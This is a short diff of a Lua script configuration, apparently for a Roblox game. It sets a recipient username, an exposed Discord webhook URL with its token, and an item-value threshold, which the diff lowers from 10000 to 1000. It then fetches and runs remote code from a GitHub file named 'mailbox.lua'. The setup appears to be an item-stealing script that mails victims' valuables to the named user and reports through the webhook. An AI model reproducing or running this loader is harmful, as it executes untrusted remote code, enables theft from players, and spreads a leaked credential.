@@ -1,4 +1,4 @@
 UserName = "DE4D4EVER"
 WebHook = "https://discord.com/api/webhooks/1257798317593591929/JG1WIjwz-BG9qDWHfK33yqlZltKSqsyMHHoZeF7er88FEQlbT3eKu4Gqu0l40LAN93Z6"
-RAP = 10000
+RAP = 1000
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PS99/main/mailbox.lua"))()
